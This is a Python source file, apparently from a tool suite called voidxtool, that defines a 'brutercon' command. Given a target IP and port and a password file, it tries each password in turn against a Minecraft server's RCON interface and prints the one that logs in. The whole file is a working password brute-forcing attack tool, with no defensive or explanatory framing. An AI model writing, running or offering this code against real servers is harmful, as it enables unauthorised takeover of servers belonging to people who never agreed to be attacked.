import os
from typing import Optional
from rich.console import Console
from loguru import logger
from voidxtool.logs import LogsManager
from voidxtool.utilities.rcon import MCRcon, MCRconException
from voidxtool.commands.base import BaseCommand
from voidxtool.commands.validator import Validator
from voidxtool.gui.language import Msg
from voidxtool.utilities import SendNotification
from voidxtool.auth.login import Authentication

console: Console = Console()

class BruteRconCommand(BaseCommand):
    def __init__(self):
        super().__init__(name='brutercon')
        self.target = None
        self.password_file = None
        self.logs_manager = None

    def custom_validate_arguments(self, user_arguments: list) -> bool:
        self.target = user_arguments[0]
        self.password_file = user_arguments[1]
        if not Validator.is_ip_and_port(self.target):
            console.print(Msg.get('errors.invalidIpAndPort'))
            return False
        if not os.path.exists(self.password_file):
            console.print(Msg.get('errors.invalidFile'))
            return False
        return True

    def run(self, arguments: list, authentication: Authentication) -> bool:
        if not self.validate_arguments(arguments):
            return False
        self.custom_validate_arguments(arguments)
        self.logs_manager = LogsManager()
        try:
            with open(self.password_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            for password in passwords:
                try:
                    with MCRcon(self.target.split(':')[0], password, int(self.target.split(':')[1])) as rcon:
                        response = rcon.command("list")
                        if response:
                            console.print(f"Success: {password}")
                            return True
                except MCRconException:
                    continue
            console.print(Msg.get('errors.passwordNotFound'))
        except Exception as e:
            logger.error(f"Error running RCON brute: {e}")
        return False

    __static_attributes__ = (
        'logs_manager',
        'password_file',
        'target'
    )